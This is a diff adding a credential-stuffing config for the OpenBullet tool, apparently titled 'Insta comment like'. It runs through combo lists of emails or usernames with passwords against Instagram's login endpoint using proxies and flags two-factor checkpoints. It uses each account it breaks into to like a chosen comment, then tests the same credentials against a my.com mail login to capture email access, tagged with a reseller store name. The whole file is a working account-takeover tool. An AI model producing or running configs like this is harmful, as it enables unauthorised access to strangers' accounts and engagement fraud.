@@ -1,0 +1,87 @@
+[SETTINGS]
+{
+  "Name": "Insta comment like",
+  "SuggestedBots": 200,
+  "LastModified": "2019-06-15T21:46:22.7700955-07:00",
+  "AdditionalInfo": "",
+  "Author": "DaniCGI",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://www.instagram.com/accounts/login/ajax/" 
+  CONTENT "username=<USER>&password=<PASS>&queryParams=%7B%7D&optIntoOneTap=false" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER ": scheme: https" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: el-GR,el;q=0.9,en;q=0.8" 
+  HEADER "content-length: 70" 
+  HEADER "origin: https://www.instagram.com" 
+  HEADER "referer: https://www.instagram.com/" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
+  HEADER "x-csrftoken: zhyfnT8y6gosM0V0AeVYG3j4QChtrNzs" 
+  HEADER "x-ig-app-id: 936619743392459" 
+  HEADER "x-instagram-ajax: ceefc659ad3e" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"authenticated\": true" 
+  KEYCHAIN Failure OR 
+    KEY "{\"authenticated\": false" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "checkpoint_required" 
+#Like_comment REQUEST POST "https://www.instagram.com/web/comments/like/18058684123102219/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER ": scheme: https" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,fa;q=0.8" 
+  HEADER "content-length: 0" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "origin: https://www.instagram.com" 
+  HEADER "referer: https://www.instagram.com/p/BysgCJ6F0dh/" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
+  HEADER "x-csrftoken: <COOKIES(csrftoken)>" 
+  HEADER "x-ig-app-id: 936619743392459" 
+  HEADER "x-instagram-ajax: 834dd25d4911" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "status\": \"fail\"}" 
+  KEYCHAIN Success OR 
+    KEY "\"status\": \"ok\"" 
+
+REQUEST GET "https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login=<USER>&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=fr_FR&Password=<PASS>&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "UserAgent: MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0" 
+  HEADER "ContentType: application/x-www-form-urlencoded" 
+PARSE "<SOURCE>" LR "[\"AjaxResponse\", \"OK\", \"" "\"]" -> VAR "ACCESS" "" " | uniquevintage.selly.store" 
+FUNCTION Replace "Ok=0" "False" "<ACCESS>" -> CAP "Email Access" 
+FUNCTION Replace "Ok=1" "True" "<ACCESS>" -> CAP "Email Access" 
+
